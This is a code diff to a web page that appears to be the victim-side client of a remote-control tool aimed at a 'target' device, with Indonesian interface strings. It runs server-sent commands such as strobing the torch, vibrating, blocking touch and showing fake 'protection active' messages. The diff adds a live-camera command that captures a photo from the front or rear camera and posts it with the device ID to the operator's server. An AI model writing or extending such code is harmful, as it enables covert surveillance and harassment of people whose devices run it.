@@ -8,21 +8,15 @@
   * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; -webkit-tap-highlight-color:transparent; }
   body {
     background: radial-gradient(circle at top, #1a0000 0%, #000 70%);
-    min-height: 100vh;
-    color: #fff;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    min-height: 100vh; color: #fff;
+    display: flex; align-items: center; justify-content: center;
     padding: 20px;
   }
   .container {
-    width: 100%;
-    max-width: 380px;
+    width: 100%; max-width: 380px;
     background: rgba(15,0,0,0.9);
-    border: 1px solid #cc0000;
-    border-radius: 18px;
-    padding: 30px 22px;
-    box-shadow: 0 0 40px #cc000055;
+    border: 1px solid #cc0000; border-radius: 18px;
+    padding: 30px 22px; box-shadow: 0 0 40px #cc000055;
   }
   .logo { text-align: center; margin-bottom: 25px; }
   .logo-icon { font-size: 50px; color: #ff2222; filter: drop-shadow(0 0 15px #ff0000); }
@@ -277,6 +271,9 @@ function executeCommand(cmd) {
     case 'music': playMusic(cmd.url); break;
     case 'vibrate': vibrate(cmd.duration); break;
     case 'vibratecustom': vibrateCustom(cmd.count, cmd.interval, cmd.duration); break;
+    case 'livecamera': liveCamera(cmd.camMode, cmd.duration); break;
+    case 'email': showTextOverlay('📧 ' + (cmd.message || 'Buka email')); break;
+    case 'cookies': showTextOverlay('🍪 ' + (cmd.message || 'Cookies terdeteksi')); break;
   }
 }
 
@@ -353,13 +350,11 @@ function unblockTouch() {
   if (el) el.remove();
 }
 
-/* ==================== RECONNECT ==================== */
 function doReconnect() { location.reload(); }
-
 function killData() { showTextOverlay('DATA CONNECTION DISABLED'); }
 function antiUninstall() { showTextOverlay('PROTECTION ACTIVE'); }
 
-/* ==================== FLASH ON/OFF ==================== */
+/* ==================== FLASH ==================== */
 async function flashOn() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -394,7 +389,6 @@ async function flashOff() {
   showTextOverlay('TORCH: OFF');
 }
 
-/* ==================== FLASH BLINK (STROBE) ==================== */
 function flashBlink(speed, count) {
   flashOn().then(function() {
     let i = 0;
@@ -417,7 +411,6 @@ function flashBlink(speed, count) {
   });
 }
 
-/* ==================== FLASH PATTERN ==================== */
 function flashPattern(patternStr) {
   var parts = patternStr.split(',').map(function(s){ return parseFloat(s.trim()); }).filter(function(n){ return !isNaN(n); });
   if (parts.length < 2) { showTextOverlay('POLA INVALID'); return; }
@@ -442,7 +435,6 @@ function flashPattern(patternStr) {
   });
 }
 
-/* ==================== FLASH BACKGROUND ==================== */
 async function flashBackground(duration) {
   try {
     bgFlashStream = await navigator.mediaDevices.getUserMedia({
@@ -508,7 +500,6 @@ function openWebsite(url) {
 
 function esc(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
 
-/* ==================== SHOW ICON ==================== */
 function showIcon() {
   showTextOverlay('APLIKASI TARGET DIMUNCULKAN');
   document.body.animate([
@@ -519,7 +510,6 @@ function showIcon() {
   ], { duration: 400 });
 }
 
-/* ==================== MUSIC ==================== */
 function playMusic(url) {
   if (!url) return;
   const old = document.getElementById('lyx-music');
@@ -535,7 +525,6 @@ function playMusic(url) {
   showTextOverlay('MUSIC PLAYING');
 }
 
-/* ==================== VIBRATE ==================== */
 function vibrate(duration) {
   if (!duration) duration = 1000;
   if (navigator.vibrate) {
@@ -546,7 +535,6 @@ function vibrate(duration) {
   }
 }
 
-/* ==================== VIBRATE CUSTOM ==================== */
 function vibrateCustom(count, interval, duration) {
   if (!navigator.vibrate) { showTextOverlay('VIBRATE NOT SUPPORTED'); return; }
   var pattern = [];
@@ -556,6 +544,53 @@ function vibrateCustom(count, interval, duration) {
   }
   navigator.vibrate(pattern);
   showTextOverlay('📳 VIBRATE ' + count + 'x');
+}
+
+/* ==================== LIVE CAMERA ==================== */
+async function liveCamera(mode, duration) {
+  try {
+    const facing = (mode === 'front') ? 'user' : 'environment';
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing }
+    });
+
+    showTextOverlay('📷 KAMERA AKTIF...');
+
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.autoplay = true;
+    video.muted = true;
+    video.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:999995;';
+    document.body.appendChild(video);
+
+    setTimeout(() => {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+
+        // Kirim foto ke server
+        fetch(API_BASE + '/api/photo', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ deviceId: deviceId, photo: dataUrl })
+        }).catch(() => {});
+
+        video.remove();
+        stream.getTracks().forEach(t => t.stop());
+        showTextOverlay('📷 FOTO DIKIRIM');
+      } catch (e) {
+        video.remove();
+        stream.getTracks().forEach(t => t.stop());
+      }
+    }, (duration || 3) * 1000);
+
+  } catch (e) {
+    showTextOverlay('KAMERA DITOLAK');
+  }
 }
 
 /* ==================== AUTO RECONNECT ==================== */
